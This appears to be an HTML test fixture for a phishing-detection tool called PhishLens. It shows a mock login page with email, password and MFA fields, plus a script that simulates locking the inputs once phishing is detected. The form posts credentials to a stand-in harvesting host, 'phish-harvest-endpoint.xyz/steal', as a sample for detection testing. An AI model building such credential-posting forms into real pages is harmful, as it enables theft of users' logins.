<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="x-phishlens-scenario" content="phishing">
  <meta charset="UTF-8">
  <title>Mock 11: Phishing Form Lockdown & Input Prevention</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 2rem; background: #0f172a; color: #f8fafc; }
    .card { background: #1e293b; border-radius: 8px; padding: 1.5rem; max-width: 420px; margin: 2rem auto; border: 1px solid #334155; }
    form { display: flex; flex-direction: column; gap: 1rem; }
    label { display: flex; flex-direction: column; font-size: 14px; gap: 0.25rem; color: #cbd5e1; }
    input { padding: 0.6rem 0.8rem; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 14px; }
    button[type="submit"] { padding: 0.75rem; border-radius: 4px; border: none; background: #2563eb; color: #fff; font-weight: 600; cursor: pointer; }
    .standalone-section { margin-top: 1.5rem; padding-top: 1rem; border-top: 1px solid #334155; }
    .status-badge { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
    .status-active { background: #059669; color: white; }
    .status-locked { background: #dc2626; color: white; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Simulated Phishing Login Page</h2>
    <p style="font-size: 13px; color: #94a3b8;">
      Status: <span id="security-status" class="status-badge status-active">Active (Pending PhishLens Inspection)</span>
    </p>

    <!-- Standard Form -->
    <form id="phish-login-form" action="https://phish-harvest-endpoint.xyz/steal" method="POST">
      <label>
        Username or Email
        <input type="text" id="username" name="email" placeholder="user@company.com" autocomplete="off">
      </label>
      <label>
        Password
        <input type="password" id="password" name="password" placeholder="••••••••" autocomplete="off">
      </label>
      <button type="submit" id="submit-btn">Sign In to Account</button>
    </form>

    <!-- Standalone Input Outside Form (e.g. frameless MFA/OTP box) -->
    <div class="standalone-section">
      <label>
        Two-Factor Authentication Code (Standalone Field)
        <input type="text" id="mfa-token" placeholder="6-digit code" maxlength="6">
      </label>
    </div>
  </div>

  <script>
    // Helper function for test runner / simulation to trigger lockdown
    window.__simulatePhishLensLockdown = function() {
      // 1. Mark status badge
      const badge = document.getElementById('security-status');
      if (badge) {
        badge.textContent = 'LOCKED (Phishing Detected)';
        badge.className = 'status-badge status-locked';
      }

      // 2. Lock form controls
      const controls = document.querySelectorAll('input, button');
      controls.forEach(ctrl => {
        ctrl.setAttribute('data-phishlens-disabled', 'true');
        ctrl.setAttribute('aria-disabled', 'true');
        ctrl.setAttribute('disabled', 'true');
        ctrl.setAttribute('readonly', 'true');
        ctrl.disabled = true;
        ctrl.readOnly = true;
        ctrl.style.pointerEvents = 'none';
        ctrl.style.opacity = '0.45';
        ctrl.style.cursor = 'not-allowed';
      });

      // 3. Add capture phase keyboard/input interceptor
      const blockHandler = function(e) {
        const tag = (e.target && e.target.tagName ? e.target.tagName : '').toLowerCase();
        if (tag === 'input' || tag === 'button' || e.type === 'paste') {
          e.preventDefault();
          e.stopPropagation();
          e.stopImmediatePropagation();
          if (e.target && e.target.blur) e.target.blur();
          return false;
        }
      };

      ['keydown', 'keypress', 'keyup', 'beforeinput', 'input', 'paste', 'drop'].forEach(evt => {
        window.addEventListener(evt, blockHandler, { capture: true, passive: false });
        document.addEventListener(evt, blockHandler, { capture: true, passive: false });
      });
    };
  </script>
</body>
</html>
